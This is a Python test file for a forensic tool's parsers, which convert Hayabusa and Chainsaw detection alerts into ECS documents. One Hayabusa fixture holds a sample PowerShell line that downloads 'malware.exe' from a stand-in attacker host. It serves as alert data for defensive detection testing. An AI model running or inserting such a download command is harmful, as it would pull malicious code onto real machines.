"""Tests for the Hayabusa and Chainsaw integrations (D6).

Tests the parsing and mapping of Hayabusa and Chainsaw JSON alerts to ECS.
"""

from __future__ import annotations

from nighteye.ingest.chainsaw import parse_chainsaw_alert
from nighteye.ingest.hayabusa import parse_hayabusa_alert


# ============================================================
# Hayabusa Parser
# ============================================================


class TestHayabusaParser:
    def test_parse_hayabusa_alert(self) -> None:
        alert = {
            "Timestamp": "2026-04-30T10:00:00.000Z",
            "Rule Title": "Suspicious PowerShell Download",
            "Rule Level": "high",
            "Event ID": 4104,
            "Computer": "WKSTN-01",
            "Details": {
                "ScriptBlockText": "Invoke-WebRequest http://evil.com/malware.exe -OutFile C:\\malware.exe",
                "UserName": "bob"
            }
        }
        
        doc = parse_hayabusa_alert(alert, host_name="WKSTN-01", source_file="hayabusa_out.json", case_id="INC-01")
        
        assert doc is not None
        assert doc["@timestamp"] == "2026-04-30T10:00:00.000Z"
        assert doc["host"]["name"] == "WKSTN-01"
        assert doc["event"]["code"] == "4104"
        assert doc["event"]["kind"] == "alert"
        assert doc["event"]["action"] == "sigma-alert"
        assert doc["rule.name"] == "Suspicious PowerShell Download"
        assert doc["rule.level"] == "high"
        assert doc["user"]["name"] == "bob"

    def test_missing_rule_title_returns_none(self) -> None:
        alert = {
            "Timestamp": "2026-04-30T10:00:00.000Z",
            "Event ID": 4104,
        }
        doc = parse_hayabusa_alert(alert, host_name="WKSTN-01", source_file="out.json", case_id="INC-01")
        assert doc is None


# ============================================================
# Chainsaw Parser
# ============================================================


class TestChainsawParser:
    def test_parse_chainsaw_alert(self) -> None:
        alert = {
            "timestamp": "2026-04-30T11:00:00.000Z",
            "name": "Whoami Execution",
            "level": "low",
            "author": "Florian Roth",
            "document": {
                "Event": {
                    "System": {
                        "EventID": 4688,
                        "Computer": "DC01"
                    },
                    "EventData": {
                        "TargetUserName": "admin",
                        "NewProcessName": "C:\\Windows\\System32\\whoami.exe"
                    }
                }
            }
        }
        
        doc = parse_chainsaw_alert(alert, host_name="DC01", source_file="chainsaw_out.json", case_id="INC-01")
        
        assert doc is not None
        assert doc["@timestamp"] == "2026-04-30T11:00:00.000Z"
        assert doc["host"]["name"] == "DC01"
        assert doc["event"]["code"] == "4688"
        assert doc["event"]["kind"] == "alert"
        assert doc["event"]["action"] == "sigma-alert"
        assert doc["rule.name"] == "Whoami Execution"
        assert doc["rule.level"] == "low"
        assert doc["rule.author"] == "Florian Roth"
        assert doc["user"]["name"] == "admin"

    def test_missing_name_returns_none(self) -> None:
        alert = {
            "timestamp": "2026-04-30T11:00:00.000Z",
        }
        doc = parse_chainsaw_alert(alert, host_name="DC01", source_file="out.json", case_id="INC-01")
        assert doc is None
